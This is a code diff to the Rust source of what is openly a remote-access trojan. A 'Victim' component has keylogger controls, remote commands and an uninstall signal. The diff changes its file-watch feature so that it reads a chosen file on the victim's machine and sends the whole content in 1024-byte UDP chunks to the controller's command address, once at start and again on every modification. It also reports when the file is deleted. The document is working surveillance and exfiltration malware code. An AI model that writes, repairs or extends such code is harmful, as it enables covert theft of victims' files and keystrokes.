@@ -25,7 +25,7 @@ use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
              PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
              PACKET_TYPE_FILE_WATCH,
-             FILE_WATCH_APPEND, FILE_WATCH_TRUNCATE, FILE_WATCH_DELETE,
+             FILE_WATCH_UPDATE, FILE_WATCH_DELETE,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
              CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
 use keylogger::Control as KeylogControl;
@@ -487,86 +487,103 @@ impl Victim {
         
         let file_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
         println!("[*] Starting file watch on: {}", file_path);
-
+        
+        // Send initial file content using PACKET_TYPE_FILE
+        if let Ok(data) = std::fs::read(&file_path) {
+            const CHUNK_SIZE: usize = 1024;
+            for chunk in data.chunks(CHUNK_SIZE) {
+                self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, chunk)?;
+                thread::sleep(Duration::from_millis(50));
+            }
+            self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, &[0xFF])?;
+        }
+        
+        // Start background watcher
         let (tx, rx) = notify_channel();
         let (stop_tx, stop_rx) = mpsc::channel::<()>();
-
+        
         let mut watcher = RecommendedWatcher::new(tx, Config::default())
             .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-
+        
         watcher.watch(std::path::Path::new(&file_path), RecursiveMode::NonRecursive)
             .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-
+        
         self.file_watch_active = true;
         self.file_watch_path = Some(file_path.clone());
         self.file_watch_stop_tx = Some(stop_tx);
-
+        
+        // FIX: Clone cmd_addr before moving into thread (SocketAddr is Copy)
         let file_path_clone = file_path.clone();
         let udp_clone = udp.try_clone()?;
-
+        
         thread::spawn(move || {
             let mut last_size: u64 = 0;
             let mut last_send = Instant::now();
-
+            
             // Get initial file size
             if let Ok(metadata) = std::fs::metadata(&file_path_clone) {
                 last_size = metadata.len();
             }
-
+            
             loop {
                 // Check stop signal
                 if stop_rx.try_recv().is_ok() {
                     println!("[*] File watch stopped for {}", file_path_clone);
                     break;
                 }
-
-                match rx.recv_timeout(Duration::from_millis(300)) {
+                
+                // FIX: Use recv_timeout instead of blocking recv
+                match rx.recv_timeout(Duration::from_millis(500)) {
                     Ok(Ok(event)) => {
-                        // DEBOUNCE: Minimum 250ms between sends
-                        if last_send.elapsed() < Duration::from_millis(250) {
+                        // FIX: Add debounce - minimum 500ms between sends
+                        if last_send.elapsed() < Duration::from_millis(500) {
                             continue;
                         }
-
-                        if let Ok(metadata) = std::fs::metadata(&file_path_clone) {
-                            let new_size = metadata.len();
-
-                            // TRUNCATE detected (file shrunk)
-                            if new_size < last_size {
-                                let header = PacketHeader::new_file_watch(FILE_WATCH_TRUNCATE, 0);
-                                let mut packet = vec![0u8; HEADER_SIZE];
-                                packet.copy_from_slice(&header.to_bytes());
-                                let _ = udp_clone.send_to(&packet, cmd_addr);
-                                println!("[*] File truncate detected ({} -> {} bytes)", last_size, new_size);
-                                last_size = 0;
-                                last_send = Instant::now();
-                            }
-
-                            // APPEND detected (file grew)
-                            if new_size > last_size {
-                                if let Ok(mut file) = std::fs::File::open(&file_path_clone) {
-                                    use std::io::{Seek, SeekFrom, Read};
-
-                                    if file.seek(SeekFrom::Start(last_size)).is_ok() {
-                                        let mut buffer = vec![0u8; (new_size - last_size) as usize];
-                                        
-                                        if file.read_exact(&mut buffer).is_ok() {
-                                            let header = PacketHeader::new_file_watch(
-                                                FILE_WATCH_APPEND,
-                                                buffer.len() as u32,
-                                            );
-
-                                            let mut packet = Vec::with_capacity(HEADER_SIZE + buffer.len());
-                                            packet.extend_from_slice(&header.to_bytes());
-                                            packet.extend_from_slice(&buffer);
-
+                        
+                        match event.kind {
+                            EventKind::Modify(_) | EventKind::Access(_) | EventKind::Create(_) => {
+                                // FIX: Add delay to ensure file write is complete
+                                thread::sleep(Duration::from_millis(300));
+                                
+                                if let Ok(metadata) = std::fs::metadata(&file_path_clone) {
+                                    let new_size = metadata.len();
+                                    
+                                    // Only send if size actually changed
+                                    if new_size != last_size {
+                                        if let Ok(data) = std::fs::read(&file_path_clone) {
+                                            println!("[*] File changed, sending {} bytes", data.len());
+                                            
+                                            // Send file content in chunks using PACKET_TYPE_FILE_WATCH
+                                            const CHUNK_SIZE: usize = 1024;
+                                            for chunk in data.chunks(CHUNK_SIZE) {
+                                                let header = PacketHeader::new_file_watch(FILE_WATCH_UPDATE, chunk.len() as u32);
+                                                let mut packet = Vec::with_capacity(HEADER_SIZE + chunk.len());
+                                                packet.extend_from_slice(&header.to_bytes());
+                                                packet.extend_from_slice(chunk);
+                                                let _ = udp_clone.send_to(&packet, cmd_addr);
+                                            }
+                                            
+                                            // FIX: Send empty packet to signal end of update
+                                            let header = PacketHeader::new_file_watch(FILE_WATCH_UPDATE, 0);
+                                            let mut packet = vec![0u8; HEADER_SIZE];
+                                            packet.copy_from_slice(&header.to_bytes());
                                             let _ = udp_clone.send_to(&packet, cmd_addr);
-                                            println!("[*] Sent {} appended bytes", buffer.len());
+                                            
+                                            last_size = new_size;
                                             last_send = Instant::now();
                                         }
                                     }
-                                    last_size = new_size;
                                 }
                             }
+                            EventKind::Remove(_) => {
+                                let header = PacketHeader::new_file_watch(FILE_WATCH_DELETE, 0);
+                                let mut packet = vec![0u8; HEADER_SIZE];
+                                packet.copy_from_slice(&header.to_bytes());
+                                let _ = udp_clone.send_to(&packet, cmd_addr);
+                                println!("[*] File deleted on victim");
+                                break;
+                            }
+                            _ => {}
                         }
                     }
                     Ok(Err(e)) => {
@@ -579,7 +596,7 @@ impl Victim {
                 }
             }
         });
-
+        
         Ok(())
     }
 
